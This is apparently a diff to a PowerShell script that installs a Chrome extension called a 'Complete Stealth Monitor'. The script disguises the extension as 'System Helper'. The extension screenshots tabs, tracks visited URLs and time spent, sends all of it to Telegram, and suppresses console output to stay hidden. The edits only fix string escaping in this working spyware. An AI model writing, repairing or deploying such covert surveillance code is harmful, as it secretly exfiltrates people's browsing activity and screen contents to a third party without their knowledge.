@@ -27,7 +27,7 @@ New-Item -ItemType Directory -Force -Path $EXTENSION_DIR | Out-Null
 }
 '@ | Out-File -FilePath "$EXTENSION_DIR\manifest.json" -Encoding UTF8 -Force
 
-# Create background.js with embedded credentials
+# Create background.js
 $backgroundJS = @"
 // sssender - Complete Stealth Monitor
 
@@ -79,7 +79,7 @@ function capture() {
         if (!screenChanged(screenshot)) return;
       }
       lastScreen = screenshot;
-      const msg = `📸 ${tab.title || 'Screen'}\n🔗 ${tab.url || ''}\n⏰ ${new Date().toLocaleString()}`;
+      const msg = ` + "`" + `📸 ${tab.title || 'Screen'}\\n🔗 ${tab.url || ''}\\n⏰ ${new Date().toLocaleString()}` + "`" + `;
       sendTelegram(msg, screenshot);
       trackActivity(tab.url);
     });
@@ -120,7 +120,7 @@ function trackActivity(url) {
   if (lastUrl && lastUrl !== url) {
     const secs = Math.floor((now - lastTime) / 1000);
     if (secs > 3) {
-      sendTelegram(`⏱️ ${formatTime(secs)} on ${lastUrl}`);
+      sendTelegram(` + "`" + `⏱️ ${formatTime(secs)} on ${lastUrl}` + "`" + `);
     }
   }
   lastUrl = url;
@@ -138,7 +138,7 @@ chrome.tabs.onUpdated.addListener((id, info, tab) => {
     const now = Date.now();
     if (lastUrl && lastUrl !== tab.url) {
       const secs = Math.floor((now - lastTime) / 1000);
-      if (secs > 3) sendTelegram(`🔄 ${tab.url} (${formatTime(secs)})`);
+      if (secs > 3) sendTelegram(` + "`" + `🔄 ${tab.url} (${formatTime(secs)})` + "`" + `);
     }
     lastUrl = tab.url;
     lastTime = now;
@@ -151,7 +151,7 @@ chrome.tabs.onActivated.addListener((info) => {
     const now = Date.now();
     if (lastUrl && lastUrl !== tab.url) {
       const secs = Math.floor((now - lastTime) / 1000);
-      if (secs > 3) sendTelegram(`🔄 ${tab.url} (${formatTime(secs)})`);
+      if (secs > 3) sendTelegram(` + "`" + `🔄 ${tab.url} (${formatTime(secs)})` + "`" + `);
     }
     lastUrl = tab.url;
     lastTime = now;
@@ -168,7 +168,7 @@ console.warn = () => {};
 console.log = () => {};
 
 setTimeout(() => {
-  sendTelegram(`🟢 System Helper active\n🆔 ${Math.random().toString(36).substr(2, 8)}`);
+  sendTelegram(` + "`" + `System Helper active\\nID: ${Math.random().toString(36).substr(2, 8)}` + "`" + `);
 }, 2000);
 "@
 
